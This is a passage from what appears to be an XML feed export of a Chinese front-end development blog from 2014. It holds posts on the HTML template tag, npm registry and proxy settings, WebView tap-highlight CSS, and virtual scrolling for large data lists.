class="line"><span class="language-javascript">    btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = datas.<span class="property">length</span>; i &lt; len; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> data = datas[i];</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 获取模板代码</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> htmlTpl = tpl.<span class="property">content</span>.<span class="title function_">cloneNode</span>(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 插入数据</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> spans = htmlTpl.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;span&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            spans[<span class="number">0</span>].<span class="property">textContent</span> = data.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">            spans[<span class="number">1</span>].<span class="property">textContent</span> = data.<span class="property">age</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 插入到 DOM 中</span></span></span><br><span class="line"><span class="language-javascript">            list.<span class="title function_">appendChild</span>(htmlTpl);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里使用的 template 标签，标签的内容没有被解析，我们并没有也使用 innerHTML 这种暴力手段获取模板内容。</p><h3>二、template 标签特性</h3><ol><li>这个标签可以被定义在任何位置：head 中、body中、甚至是一个 frame 中。</li><li>标签内容不会显示出来</li><li>Template 标签不被当做 document 的一部分，你可以去试试弹出 <code>document.getElementById("tpl").length</code>, 或者看看他其他的属性，得到的结果都是 undefined。</li><li>标签内容在被应用之前，都是 inactive 状态，也就是说模板中的 img、audio、script 标签都不会执行（加载）</li></ol><h3>三、浏览器对 template 标签的解析</h3><p>每一个 template 元素都会和一个 DocumentFragment 对象关联，当一个 template 元素被创建时，浏览器会运行如下操作：</p><ol><li><span class="translator" title="Let doc be the template element's ownerDocument's appropriate template contents owner document.">让文档（doc）是模板元素的ownerDocument的相应的模板内容拥有者文档（owerDocument）。</span></li><li><span class="translator" title="Create a DocumentFragment object whose ownerDocument is doc.">创建一个 DocumentFragment 对象，这个对象的拥有者文档（owerDocument）为 doc</span></li><li><span class="translator" title="Set the template element's template contents to the newly created DocumentFragment object.">将模板文档的 content 内容放到上述新创建的 DocumentFragment 中</span></li></ol><p>上面的过程我是翻译 w3c 的规范文档，读起来相当晦涩，如果你了解 <a href="http://www.zhihu.com/question/22326250/answer/21686102" target="_blank">shadowDOM</a>,那理解起来就轻松了，template 在解析是，其内容被解析成一个 shadowDOM，我们只能使用 content 属性来获取到这个 shadowDOM 的内容。</p><h3>四、兼容性与需要注意的地方</h3><p>很可惜，这玩意儿虽然好用，但 IE 目前还不支持，当然 Chrome 32+ | Firefox 25+ 都提供了支持。</p><h4>1. 克隆节点而不是直接使用</h4><p>从上面的 demo 中，可以发现，获取 template 标签的内容，其方式是：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">document<span class="selector-class">.getElementById</span>(<span class="string">&quot;tpl&quot;</span>)<span class="selector-class">.content</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我并不是直接将 content 赋值给 htmlTpl，而是：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">htmlTpl</span> = tpl.content.cloneNode(<span class="literal">true</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为什么要这么做呢？如果你不是用 cloneNode，而是直接将内容 appendChild 到 DOM 树中，documentFragment 内的内容就会被清空，上面我们说了 template 标签内容就是一个 documentFragment 的 shadowDOM，所以应该使用 cloneNode 或者 importNode 方法将内容复制到 DOM 中，这样才能保证这个 shadowDOM 内容不被清空，从而可以复用（你可以把上面 demo 的 cloneNode 函数去掉，看看结果如何）。</p><h4>2. 不支持 template 标签的降级处理</h4><p>其实也没有比较好的降级处理方案，如果你在 template 中放了 script 或者 img 节点，这些内容都会被解析出来，你阻止不了，所以如果你的程序要兼容所有的浏览器，暂时就不要用了。当然，你可以做这样的判断：</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="string">&quot;content&quot;</span> <span class="keyword">in</span> <span class="built_in">document</span>.createElement(<span class="string">&quot;template&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">// code here..</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>3. 模板中嵌入模板</h4><p>在 script 标签中嵌入一个 script 标签，这个几乎是不可能的事情吧，但是 template 可以：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;template id=<span class="string">&quot;ulList&quot;</span>&gt;</span></span><br><span class="line">    <span class="section">&lt;li&gt;</span></span><br><span class="line">        <span class="section">&lt;strong&gt;</span><span class="section">&lt;%=content%&gt;</span><span class="section">&lt;/%=content%&gt;</span><span class="section">&lt;/strong&gt;</span></span><br><span class="line">        <span class="section">&lt;template&gt;</span></span><br><span class="line">            <span class="section">&lt;div&gt;</span></span><br><span class="line">                <span class="section">&lt;p&gt;</span><span class="section">&lt;%=detail%&gt;</span><span class="section">&lt;/%=detail%&gt;</span><span class="section">&lt;/p&gt;</span></span><br><span class="line">            <span class="section">&lt;/div&gt;</span></span><br><span class="line">        <span class="section">&lt;/template&gt;</span></span><br><span class="line">    <span class="section">&lt;/li&gt;</span></span><br><span class="line"><span class="section">&lt;/template&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至于插入之后是个什么效果，读者可以自己去浏览器中查看。这种插入方式是有使用场景的，很多时候我们都是给需要应用模板的元素设置一个 id 或者 class ，方便找到他们，而这种直接插入的方式，我们可以利用模板代码直接找到需要应用模板的元素，如：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var tpl = ulList.get<span class="constructor">ElementsByTagName(<span class="string">&quot;template&quot;</span>)</span><span class="literal">[<span class="number">0</span>]</span>; <span class="comment">// 获取模板</span></span><br><span class="line">var toBox = tpl.parentNode; <span class="comment">// 直接定位要插入的位置</span></span><br><span class="line">toBox.append<span class="constructor">Child(<span class="params">tpl</span>.<span class="params">content</span>.<span class="params">cloneNode</span>(<span class="params">true</span>)</span>); <span class="comment">// 插入</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>五、拓展 web components</h3><p>Web Components 是一些规范，旨在以浏览器原生的方式向外提供组件，它的规范如下:</p><ul><li>模板（Templates）可以将不必立即渲染的元素，不必立即执行的脚本放入这里。</li><li>装饰器（Decorators）</li><li>Shadow DOM</li><li>自定义元素（Custom Elements），实现自定义html标签，及属性。拥有同原生组件一样的生命周期</li><li>Imports, 指定引入的组件文档及类型</li></ul><p>其实本文提到的内容就是 web components 的冰山一角，感兴趣的童鞋可以去读一读相关的内容。</p><ul><li><a href="http://www.html5rocks.com/zh/tutorials/webcomponents/imports/" target="_blank">http://www.html5rocks.com/zh/tutorials/webcomponents/imports/</a> HTML Imports</li><li><a href="http://www.w3.org/TR/components-intro/" target="_blank">http://www.w3.org/TR/components-intro/</a> w3c components</li><li><a href="http://www.html5rocks.com/zh/search?q=web+components" target="_blank">http://www.html5rocks.com/zh/search?q=web+components</a> search</li></ul><h3>六、小结</h3><p>本文稀里哗啦说了一大串，主要是简单介绍 web components 中的 template 标签，用以替换模板代码容器 script/textarea，web components 肯定是 web 发展的一个大头，尤其是移动开发上，很有必要深入研究。</p><h3>七、参考资料</h3><ul><li><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage//scripting-1.html#the-template-element" target="_blank">http://www.whatwg.org/specs/web-apps/current-work/multipage//scripting-1.html#the-template-element</a> W3C</li><li><a href="//developer.mozilla.org/en-US/docs/Web/HTML/Element/template" target="_blank">//developer.mozilla.org/en-US/docs/Web/HTML/Element/template</a> MDN</li><li><a href="http://www.c-sharpcorner.com/UploadFile/370e35/template-tag-in-html5/" target="_blank">http://www.c-sharpcorner.com/UploadFile/370e35/template-tag-in-html5/</a> Sunny Kumar</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm穿墙</title>
      <link href="/blog/2014/03/31/npm-cross-wall/"/>
      <url>/blog/2014/03/31/npm-cross-wall/</url>
      
        <content type="html"><![CDATA[<p>GWF 很给力，很多东西都能墙掉，但是把 npm 也纳入黑名单，不知道 GWFer 是怎么想的。翻墙翻了好多年了，原理其实也挺简单的，proxy 嘛！</p><h3 id="»-方法一"><a href="#»-方法一" class="headerlink" title="» 方法一"></a>» 方法一</h3><p><strong>A)</strong> 国内源，<a href="http://cnpmjs.org/">http://cnpmjs.org</a></p><p>使用方式，你可以在 cmd 中键入 <code>npm install -g cnpm</code>，然后出去吃个饭，如果还没有安装好，那就换个方式：</p><pre><code>npm install -g cnpm --registry=http://r.cnpmjs.org</code></pre><p>registry 参数的作用就是指向需要 download 的仓库。 cnpm 跟国外的 npm 是同步的，只要 npm 有更新，cnpm 就会跟着一起更新。</p><p>当然，你也可以简单点搞：</p><pre><code>npm config set registry=&quot;http://r.cnpmjs.org&quot;</code></pre><p>在配置中直接指定源头，下次就没有必要使用 <code>--registry</code> 参数了。配置好了之后，npm 就指向了国内的仓库。</p><p><strong>B)</strong> 当然，你也可以安装 cnpm，安装好了之后使用 cnpm 来下载文件，其实原理跟上面是一样的，于是你就可以这样了：</p><pre><code>cnpm install -g package_name</code></pre><h3 id="»-方法二"><a href="#»-方法二" class="headerlink" title="» 方法二"></a>» 方法二</h3><p>代理，在配置中设置代理参数：</p><pre><code># 全局路径，也就是 npm install -g，这里 -g 的意义npm config set prefix=&quot;c:\nodejs&quot;# 一般使用 goagent 翻墙，他的默认端口是 8087npm config set proxy=http://127.0.0.1:8087# 设置 https 的代理npm config set https_proxy=http://127.0.0.1:8087# 这个地方记得设置下，别搞了个代理，结果在国内源下载npm config set registry=http://registry.npmjs.org</code></pre><p>这样配置好了之后，打开你的 goagent ，记得一定要打开，不然 npm 必然报错。上面写了一堆，其实没必要跟着写这么多，一句话就可以搞定：</p><pre><code>npm config set proxy=http://127.0.0.1:8087</code></pre><p>为啥呢，npm -g 没必要自己去配置， registry 默认就是 <code>http://registry.npmjs.org</code>，不配置 https_proxy，也走的通，所以就只剩下上面这条命令了。</p><h3 id="»-方法三"><a href="#»-方法三" class="headerlink" title="» 方法三"></a>» 方法三</h3><p>直接下载到本地。</p><p>实在是怕麻烦，就直接把文件 download 下来，然后放到 node_module 之中就行了。如果是全局模块，找到全局 node_module 的位置，然后解压放进去就行了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老程序员Vs新程序员</title>
      <link href="/blog/2014/03/31/old-programmer-vs-newer/"/>
      <url>/blog/2014/03/31/old-programmer-vs-newer/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>经验越足、知道的越多编程越慢</strong><br /><br>这就是为何不能让老程序员冲锋在一线开发岗位的原因。因为编程经验越足、知道的越多，他做项目时就会思前顾后。往往一个小功能给菜鸟开发需要一周，老鸟开发可能得两周，结果用户一个需求变更直接干趴老鸟程序员。</p></blockquote><p>当你成为老程序员时是否也要开始重新审视下自己？！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> talk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webview中的点击高亮问题</title>
      <link href="/blog/2014/03/31/tap-highlight-in-webview/"/>
      <url>/blog/2014/03/31/tap-highlight-in-webview/</url>
      
        <content type="html"><![CDATA[<p>这两天在做一个淘金币的小游戏，测试页面的时候还挺正常的，放到webview（嵌入诸如微信、微博等客户端的网页容器）中就出问题了。</p><p>给元素绑定了一个 tap 事件，点击元素，该元素周边会出现点东西，IOS 中是个半透明的灰色背景，在 android 中出现红色的边框，不仅影响美感，貌似还会影响性能（这点东西渲染出来需要时间，会阻塞 JS 中控制的元素渲染）。</p><p>开始本以为使用 user-select 可以干掉这玩意儿，结果无效，网上寻觅半天之后，找到了问题。</p><p>css 中有个属性叫做 -webkit-tap-highlight-color ，顾名思义，就是点击元素的时候会有一个高亮的效果。当然不能把他称之为 bug，这也是浏览器为了让用户知道你点中了某个东西，给他醒目的提示，算是增强体验，但是在一些场景中，这不仅没有增强体验，还会影响体验。</p><p>解决方案：</p><pre><code>.obj &#123;-webkit-tap-highlight-color:rgba(0,0,0,0);&#125;</code></pre><p>有些机子可能比较坑爹，rgba 这种方式支持的不是很好，我们可以用 transparent 来给他透明化。</p><pre><code>.obj &#123;  -webkit-tap-highlight-color: rgba(0,0,0,0);  -webkit-tap-highlight-color: transparent; /* For some Androids */&#125;</code></pre><p>小小分享。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webview </tag>
            
            <tag> highlight </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个所见即所得的博客</title>
      <link href="/blog/2014/03/30/WYSIWYG/"/>
      <url>/blog/2014/03/30/WYSIWYG/</url>
      
        <content type="html"><![CDATA[<img src="https://hi.barretlee.com/imgs/shares/github-logo.png" style="width:200px;height:200px" alt="github logo" /><p>最简单的博客就是，你只需要写，其他的啥都不用管。github 就能够做到。</p><p>gihub pages 生成的页面和存放在 github 上的文件存在对应关系，我为每篇文章都加了对应的 edit 链接，这个链接被我隐藏掉了，但是只要在 url 后面加上<code>?edit</code>，就可以在文中的页面里找到这个小小的 edit 链接。同时也在<a href="/">首页</a>加了一个 new post 的链接，方便加入新的文章。</p><p>我把这个网站作为平时一些感受和想法的聚集平台，操作简单，上手方便，建议跟我一起玩玩，呵呵~</p><p>感兴趣的童鞋可以从右上角点进这个 github 地址，fork 代码后自行研究。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百万数据如何在前端快速流畅显示？</title>
      <link href="/blog/2014/03/25/cb-million-data-show-in-front-end/"/>
      <url>/blog/2014/03/25/cb-million-data-show-in-front-end/</url>
      
        <content type="html"><![CDATA[<p>如果要在前端呈现大量的数据，一般的策略就是分页。前端要呈现百万数据，这个需求是很少见的，但是展示千条稍微复杂点的数据，这种需求还是比较常见，只要内存够，javascript 肯定是吃得消的，计算几千上万条数据，js 效率根本不在话下，但是 DOM 的渲染浏览器扛不住，CPU 稍微搓点的电脑必然会卡爆。</p><p>本文的策略是，显示三屏数据，其他的移除 DOM。</p><h3 id="一、-策略"><a href="#一、-策略" class="headerlink" title="一、 策略"></a>一、 策略</h3><p>下面是我简单勾画的一个草图，我们把一串数据放到一个容器当中，这串数据的高度（Data List）肯定是比 Container 的高度要高很多的，如果我们一次性把数据都显示出来，浏览器需要花费大量的时间来计算每个 data 的位置，并且依次渲染出来，整个过程中 JS 并没有花费太多的时间，开销主要是 DOM 渲染。</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">                          /==============&gt; Data List</span><br><span class="line">        |<span class="string">     ....     </span>|<span class="string"> /</span></span><br><span class="line"><span class="string">        +--------------+/</span></span><br><span class="line"><span class="string">+=======</span>|<span class="string">=====data=====</span>|<span class="string">========+</span></span><br><span class="line"><span class="string"></span>|<span class="string">       +--------------+        </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string">     data     </span>|<span class="string">        </span>|</span><br><span class="line">|<span class="string">       +--------------+        </span>|<span class="string">\</span></span><br><span class="line"><span class="string"></span>|<span class="string">       </span>|<span class="string">     data     </span>|<span class="string">        </span>|<span class="string"> \</span></span><br><span class="line"><span class="string"></span>|<span class="string">       +--------------+        </span>|<span class="string">  \======&gt; Container</span></span><br><span class="line"><span class="string">+=======</span>|<span class="string">=====data=====</span>|<span class="string">========+</span></span><br><span class="line"><span class="string">        +--------------+</span></span><br><span class="line"><span class="string">        </span>|<span class="string">     ....     </span>|<span class="string">        Created By Barret Lee</span></span><br></pre></td></tr></table></figure><p>为了解决这个问题，我们让数据是显示一部分，这一部分是 Container 可视区域的内容，以及上下各一屏（一屏指的是 Container 高度所能容纳的区域大小）的缓存内容。如果 Container 比较高，也可是只缓存半屏，缓存的原因是，在我们滚动滚动条的时候，js 需要时间来拼凑字符串（或者创建 Node ），这个时候浏览器还来不及渲染，所以会出现临时的空白，这种体验是相当不好的。</p><h3 id="二、Demo"><a href="#二、Demo" class="headerlink" title="二、Demo"></a>二、Demo</h3><p>demo 在 IE 7、8 有 bug，请读者自己修复吧~</p><p>代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>百万数据前端快速流畅显示<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#box</span> &#123;<span class="attribute">position</span>: relative; <span class="attribute">height</span>: <span class="number">300px</span>; <span class="attribute">width</span>: <span class="number">200px</span>; <span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#CCC</span>; <span class="attribute">overflow</span>: auto&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#box</span> <span class="selector-tag">div</span> &#123; <span class="attribute">position</span>: absolute; <span class="attribute">height</span>: <span class="number">20px</span>; <span class="attribute">width</span>: <span class="number">100%</span>; <span class="attribute">left</span>: <span class="number">0</span>; <span class="attribute">overflow</span>: hidden; <span class="attribute">font</span>: <span class="number">16px</span>/<span class="number">20px</span> Courier;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> total = <span class="number">1e5</span></span></span><br><span class="line"><span class="language-javascript">  , len = total</span></span><br><span class="line"><span class="language-javascript">  , height = <span class="number">300</span></span></span><br><span class="line"><span class="language-javascript">  , delta = <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">  , num = height / delta</span></span><br><span class="line"><span class="language-javascript">  , data = [];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; total; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">  data.<span class="title function_">push</span>(&#123;<span class="attr">content</span>: <span class="string">&quot;item-&quot;</span> + i&#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> box = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">box.<span class="property">onscroll</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> sTop = box.<span class="property">scrollTop</span>||<span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">    , first = <span class="built_in">parseInt</span>(sTop / delta, <span class="number">10</span>)</span></span><br><span class="line"><span class="language-javascript">    , start = <span class="title class_">Math</span>.<span class="title function_">max</span>(first - num, <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">    , end = <span class="title class_">Math</span>.<span class="title function_">min</span>(first + num, len - <span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">    , i = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">for</span>(<span class="keyword">var</span> s = start; s &lt;= end; s++)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> child = box.<span class="property">children</span>[s];</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(!box.<span class="title function_">contains</span>(child) &amp;&amp; s != len - <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">insert</span>(s);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">while</span>(child = box.<span class="property">children</span>[i++])&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> index = child.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-index&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>((index &gt; end || index &lt; start) &amp;&amp; index != len - <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      box.<span class="title function_">removeChild</span>(child);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">insert</span>(<span class="params">i</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  div.<span class="title function_">setAttribute</span>(<span class="string">&quot;data-index&quot;</span>, i);</span></span><br><span class="line"><span class="language-javascript">  div.<span class="property">style</span>.<span class="property">top</span> = delta * i + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  div.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(data[i].<span class="property">content</span>));</span></span><br><span class="line"><span class="language-javascript">  box.<span class="title function_">appendChild</span>(div);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">box.<span class="title function_">onscroll</span>();</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">insert</span>(len - <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以戳这个 <a href="http://rawgithub.com/barretlee/9744160/raw/a71dd5561a910b48063cc81e8ee7b042cfeb1574/gistfile1.html">demo</a>，或者看这里 <a href="http://gist.github.com/barretlee/9744160">http://gist.github.com/barretlee/9744160</a></p><h3 id="三、算法说明"><a href="#三、算法说明" class="headerlink" title="三、算法说明"></a>三、算法说明</h3><h4 id="1-计算-start-和-end-节点"><a href="#1-计算-start-和-end-节点" class="headerlink" title="1. 计算 start 和 end 节点"></a>1. 计算 start 和 end 节点</h4><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">        |<span class="string">              </span>|</span><br><span class="line">+=======|<span class="string">==============</span>|<span class="string">========+——</span></span><br><span class="line"><span class="string"></span>|<span class="string">    ↓——+--------------+        </span>|<span class="string"> ↑</span></span><br><span class="line"><span class="string"></span>|<span class="string"> delta </span>|<span class="string">              </span>|<span class="string">        </span>|</span><br><span class="line">|<span class="string">    ↑——+--------------+        </span>|<span class="string"> height</span></span><br><span class="line"><span class="string"></span>|<span class="string">       </span>|<span class="string">              </span>|<span class="string">        </span>|</span><br><span class="line">|<span class="string">       +--------------+        </span>|<span class="string"> ↓</span></span><br><span class="line"><span class="string">+=======</span>|<span class="string">==============</span>|<span class="string">========+——</span></span><br><span class="line"><span class="string">        </span>|<span class="string">              </span>|</span><br></pre></td></tr></table></figure><p>Container 可以容纳的 Data 数目为 <code>num = height / delta</code>，Container 顶部第一个节点的索引值为</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> first = <span class="built_in">parseInt</span>(<span class="title class_">Container</span>.<span class="property">scrollTop</span> / delta);</span><br></pre></td></tr></table></figure><p>由于我们上下都有留出一屏，所以</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> start = <span class="title class_">Math</span>.<span class="title function_">max</span>(first - num, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> end = <span class="title class_">Math</span>.<span class="title function_">min</span>(first + num, len - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="2-插入节点"><a href="#2-插入节点" class="headerlink" title="2. 插入节点"></a>2. 插入节点</h4><p>通过上面的计算，从 start 到 end 将节点一次插入到 Container 中，并且将最后一个节点插入到 DOM 中。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 插入最后一个节点</span></span><br><span class="line"><span class="title function_">insert</span>(len - <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 插入从 start 到 end 之间的节点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> s = start; s &lt;= end; s++)&#123;</span><br><span class="line">  <span class="keyword">var</span> child = <span class="title class_">Container</span>.<span class="property">children</span>[s];</span><br><span class="line">  <span class="comment">// 如果 Container 中已经有该节点，或者该节点为最后一个节点则跳过</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title class_">Container</span>.<span class="title function_">contains</span>(child) &amp;&amp; s != len - <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_">insert</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释下为什么要插入最后一个节点，插入节点的方式是：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">insert</span>(<span class="params">i</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  div.<span class="title function_">setAttribute</span>(<span class="string">&quot;data-index&quot;</span>, i);</span><br><span class="line">  div.<span class="property">style</span>.<span class="property">top</span> = delta * i + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">  div.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(data[i].<span class="property">content</span>));</span><br><span class="line">  <span class="title class_">Container</span>.<span class="title function_">appendChild</span>(div);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们给插入的节点都加了一个 top 属性，最后一个节点的 top 是最大的，只有把这个节点插入到 DOM 中，才能让滚动条拉长，让人感觉放了很多的数据。</p><h4 id="3-删除节点"><a href="#3-删除节点" class="headerlink" title="3. 删除节点"></a>3. 删除节点</h4><p>为了减少浏览器的重排（reflow），我们可以隐藏三屏之外的数据。我这里为了方便，直接给删除掉了，后续需要再重新插入。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(child = <span class="title class_">Container</span>.<span class="property">children</span>[i++])&#123;</span><br><span class="line">  <span class="keyword">var</span> index = child.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-index&quot;</span>);</span><br><span class="line">  <span class="comment">// 这里记得不要把最后一个节点给删除掉了</span></span><br><span class="line">  <span class="keyword">if</span>((index &gt; end || index &lt; start) &amp;&amp; index != len - <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title class_">Container</span>.<span class="title function_">removeChild</span>(child);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 DOM 加载完毕之后，触发一次 <code>Container.onscroll()</code>，然后整个程序就 OK 了。</p><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>本文主要是叙述大数据加载的一点基本原理，程序可能有 bug，也有很多地方可以优化，了解下算法就行了。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>感想以及一些文章索引</title>
      <link href="/blog/2014/03/17/cb-two-yeas/"/>
      <url>/blog/2014/03/17/cb-two-yeas/</url>
      
